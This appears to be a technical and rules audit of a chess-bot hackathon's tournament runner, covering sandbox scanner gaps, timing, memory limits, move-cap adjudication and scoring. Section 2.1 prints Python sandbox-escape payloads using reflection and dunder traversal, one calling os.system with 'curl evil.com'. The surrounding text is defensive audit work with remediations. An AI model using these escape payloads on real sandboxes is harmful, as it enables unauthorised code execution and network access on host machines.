# PICT Knight Shift // Comprehensive Technical & Rules Audit

**Document:** AUDIT.md  
**Role:** Lead Rules Designer & Tournament Engineer  
**Audience:** Tournament Organizer (PICT Knight Shift)  
**Status:** Workstream A Complete — Pending Organizer Review

---

## 1. Executive Summary

This audit assesses the current tournament software stack (`hackathon/arena_runner.py`, `compliance_check.py`, `hackathon/RULES.md`, and starter templates) against the core priorities: **fairness, reproducibility, calibrated ~2000-Elo difficulty, and resistance to generic/exploit-based AI submissions.**

While the current codebase establishes a functional starting baseline, it contains **critical security loopholes, runtime scaling bottlenecks, timing vulnerabilities, and structural scoring flaws** that would compromise a high-stakes campus hackathon.

---

## 2. Security & Sandbox Loopholes (Static & Runtime)

### 2.1 Reflection & Dunder Bypasses (`__import__`, `getattr`, `__builtins__`)
* **Current Scanner Check:** The scanner in `arena_runner.py` and `compliance_check.py` checks `ast.Call` only where `node.func` is an `ast.Name` matching a literal set (`eval`, `exec`, `compile`, `open`, `__import__`).
* **Vulnerability:** It completely misses attribute-based reflection and dunder traversal. An AI agent or participant can trivially execute:
  ```python
  # Bypass 1: String concatenation getattr
  getattr(__builtins__, "ex" + "ec")("import os; os.system('...')")

  # Bypass 2: Class hierarchy object traversal
  ().__class__.__base__.__subclasses__()[138].__init__.__globals__["system"]("curl evil.com")

  # Bypass 3: Builtin dictionary access
  __builtins__["__imp" + "ort__"]("subprocess")
  ```
* **Impact:** Instant sandbox escape allowing external engines, network requests, or host filesystem tampering.
* **Remediation:** 
  1. AST visitor must strictly reject `ast.Attribute` accesses on `__class__`, `__base__`, `__bases__`, `__subclasses__`, `__globals__`, `__builtins__`, `__code__`, and `__dict__`.
  2. Ban calls to `getattr`, `setattr`, `delattr`, `hasattr`, `globals()`, `locals()`, `vars()`, and `dir()`.

### 2.2 The `chess.polyglot` vs `open()` Conflict
* **Current Rules:** Lists `chess.polyglot` as an allowed module, but strictly bans `open()`.
* **Ambiguity/Bug:** Polyglot's standard usage is `chess.polyglot.open_reader("book.bin")`, which internally calls Python's builtin `open()`. If participants attempt to load a polyglot book from disk, it violates the offline single-file rule and triggers the `open` ban. If they don't, `polyglot` is largely unused except for `chess.polyglot.zobrist_hash`.
* **Remediation:** Clarify explicitly in the rules that `chess.polyglot` is permitted solely for `zobrist_hash()`. Polyglot binary book files (`.bin`) and file readers are strictly prohibited.

### 2.3 Uncapped Embedded Literals / Data Constants
* **Vulnerability:** The current rule specifies a 150 KB (or 100 KB) file size limit, but does not cap data literals. A participant can embed a 40–80 KB compressed string (e.g. `zlib` base85/hex table) containing a precomputed endgame tablebase, neural network weights, or a massive opening tree, completely bypassing algorithmic search.
* **Remediation:** Enforce an AST-level data constant limit: no single string or byte literal may exceed 4 KB, and total cumulative literal data across all AST constants must not exceed 20 KB.

---

## 3. Timing, Resource & Architecture Vulnerabilities

### 3.1 Per-Move Subprocess Architecture vs Persistent State
* **Current Implementation:** `arena_runner.py` spawns a brand new `multiprocessing.Process` on **every single move** (`_worker_wrapper`).
* **Critical Flaws:**
  1. **OS Process Overhead:** On macOS/Linux, spawning a new process and re-importing the bot script takes 30–80 ms per move. That is 5–10% of the entire 1.0s budget wasted on OS overhead.
  2. **Destruction of Persistent State:** Because a new process is spawned every move, the bot's Transposition Table (TT), history heuristic table, and killer moves are completely wiped after every move! Iterative deepening cannot leverage previous plies, artificially degrading bot strength from ~1800 Elo down to ~1200 Elo.
* **Remediation:** Run a persistent worker process per bot per game, communicating via two `mp.Queue` channels (Move In / Move Out). This preserves internal state (TT, history) across moves while maintaining full process isolation.

### 3.2 Wall-Clock Timing vs CPU Timing & Concurrency Jitter
* **Current Implementation:** Uses `time.time()` wall-clock measurements in `arena_runner.py`.
* **Vulnerability:** Wall-clock time fluctuates heavily based on OS background processes, CPU thermal throttling, and garbage collection pauses. A legitimate bot taking 0.78s CPU time can be killed at 1.01s wall-clock time if the host laptop stutters.
* **Remediation:**
  1. Measure both CPU process time (`time.process_time()`) and high-resolution wall time (`time.perf_counter()`).
  2. Run tournament games with pinned, fixed concurrency (e.g., max 2 or 4 workers matching physical cores, never oversubscribing).

### 3.3 Memory Limits (OOM Vulnerability)
* **Current Implementation:** Zero memory limits enforced in `arena_runner.py`.
* **Vulnerability:** A bot with an uncapped Transposition Table or memory leak can allocate 8+ GB of RAM, causing the host machine to swap thrash or crash all active matches.
* **Remediation:** In POSIX environments, inject `resource.setrlimit(resource.RLIMIT_AS, (256 * 1024 * 1024, 256 * 1024 * 1024))` in the child process pre-exec/worker initialization.

---

## 4. Match Engine & Tournament Scalability Flaws

### 4.1 Plies vs Full Moves in the "120 Moves" Cap
* **Current Implementation:** `moves_played = 0; while ... moves_played < max_moves: ... moves_played += 1`.
* **Ambiguity/Bug:** `moves_played` is incremented after *every single turn* (ply). A cap of 120 means the game terminates after **60 full moves**! 
* **Impact:** 60 full moves is prematurely short for deep endgames (e.g., standard Rook + Pawn endings frequently take 70–80 moves). 
* **Remediation:** Standardize terminology: **"120 full moves (240 plies)"**, tracked via `board.fullmove_number > 120`.

### 4.2 Adjudication at the Cap (The Stalling Incentive)
* **Current Implementation:** If `moves_played >= max_moves`, `arena_runner.py` unconditionally awards a `"DRAW"`.
* **Game-Theoretic Exploit:** A bot that is completely lost (e.g., down Queen and Rook) can intentionally play slow, passive, spite moves to cross 120 moves and rob a winning bot of 0.5 points.
* **Remediation:** Explicit adjudication rules at the move cap:
  1. If material difference $\ge 400$ centipawns (a full piece or more) with no counterplay, adjudicate as a win for the material leader.
  2. If the position is drawn (or within $\pm 150$ centipawns), adjudicate as a draw.
  3. Adjudicate standard book draws automatically (e.g., K+N vs K, K+B vs K, K+N vs K+N).

### 4.3 Penalty Scope: Game Loss vs Match Forfeit
* **Current Ambiguity:** `RULES.md` and `arena_runner.py` state that an illegal move or timeout results in a "Forfeit". In round-robin pairing, it was recorded as a loss for that specific game, but called a "forfeit".
* **Remediation:** Distinguish clearly between:
  - **Game Loss (Disqualification for that game):** Timeout (> 1.0s / 1.25s hard limit), single illegal move, or unhandled runtime exception. Opponent receives 1.0 pt.
  - **Tournament Disqualification (Expulsion):** Static AST violation, detected cheat attempt, or persistent failure to launch. All matches scored as 0-1 losses.

### 4.4 Tournament Scalability: Full Round-Robin $O(N^2)$ Bottleneck
* **Current Implementation:** Full round-robin pairing $N \times (N - 1)$ games.
* **The Math:**
  - 10 bots: $10 \times 9 = 90$ games $\approx 45$ minutes.
  - 25 bots: $25 \times 24 = 600$ games $\approx 5$ hours.
  - 40 bots: $40 \times 39 = 1,560$ games $\approx 13$ hours!
* **Remediation:** Implement a two-stage tournament architecture:
  1. **Stage 1 (Swiss Qualifier):** 5 to 7 rounds of Swiss system pairings (fixed $O(N \log N)$ runtime).
  2. **Stage 2 (Championship Round-Robin):** Top 8 bots advance to a double round-robin final ($8 \times 7 = 56$ games).

---

## 5. Rules, Variants & Pedagogical Alignment

### 5.1 Variant & Chess960 Preparedness
* **Current Code:** Hardcodes `chess.Board()` everywhere.
* **Flaw:** Standard `chess.Board()` crashes or misbehaves on Chess960 castling representations (e.g. king capturing rook syntax) and fails completely on variants like King of the Hill or Atomic if not instantiated via `chess.variant`.
* **Remediation:** 
  1. Use generic board factory: `chess.Board(fen, chess960=True)` or `chess.variant.find_variant(...)`.
  2. Mandate participant code use only generic board methods: `board.legal_moves`, `board.push()`, `board.pop()`, `board.is_game_over()`, `board.outcome()`.

### 5.2 Elimination of Weak-Bot Incentive Awards
* **Flaw:** `hackathon/RULES.md` currently features a **"Speed Demon Award"** for bots calculating in under 10ms.
* **Perverse Incentive:** This directly rewards random-move bots and shallow 1-ply bots over deep calculation engines.
* **Remediation:** Remove the Speed Demon award entirely. Replace with awards that incentivize depth, resilience, and tactical creativity:
  - 👑 **Campus Grandmaster** (Tournament 1st Place)
  - 🗡️ **The Giant Slayer** (Best performance against reference masters)
  - 🛡️ **Iron Bastion** (Lowest blunder/loss rate with Black)
  - 💡 **Engineering Excellence Award** (Best design dossier and live defense)

### 5.3 Determinism and Opening Reproducibility
* **Flaw:** Running from standard starting positions encourages opening memorization or AI copy-pasting of static book lines.
* **Remediation:** 
  1. Every pairing must play **paired matches** (2 games per matchup) from the **identical balanced opening position**, swapping colors.
  2. The starting positions must be drawn pseudo-randomly from an organizer secret seed using a **Commit-Reveal scheme** (SHA-256 published before the tournament).

---

## 6. Audit Summary Matrix

| # | Item | Current Status | Risk Level | Proposed Fix |
|:---|:---|:---|:---:|:---|
| 1 | Reflection / Dunder Bypasses | Partial literal AST check | 🔴 CRITICAL | Deep AST visitor banning all dunder attrs & reflection calls |
| 2 | Persistent State / TT Memory | Re-spawns process every move | 🔴 CRITICAL | Persistent worker process per bot per game |
| 3 | Tournament Scalability ($O(N^2)$) | Unbounded round-robin | 🔴 CRITICAL | Swiss Qualifier (Stage 1) $\rightarrow$ Top 8 Round-Robin (Stage 2) |
| 4 | Memory Limit (256 MB) | Unenforced | 🟡 HIGH | `resource.setrlimit` inside isolated child worker |
| 5 | Adjudication at Move Cap | Unconditional Draw | 🟡 HIGH | Material + positional evaluation threshold adjudication |
| 6 | 120-Move Cap Definition | Counted in single plies (60 moves) | 🟡 HIGH | Standardize to 120 full moves (240 plies) |
| 7 | Data Constant Caps | Only total file size capped | 🟡 HIGH | Cap AST string/byte literals to max 4 KB each, 20 KB total |
| 8 | Chess960 / Variant Support | Standard `chess.Board()` only | 🟡 HIGH | Support generic board API & `chess960=True` |
| 9 | Speed Demon Award | Rewards shallow/random bots | 🟢 MEDIUM | Remove; replace with Giant Slayer & Engineering Dossier |
| 10 | Exact Date for Diwali Eve | Vague calendar placeholder | 🟢 LOW | Fix exact date: **Saturday, November 7, 2026** |
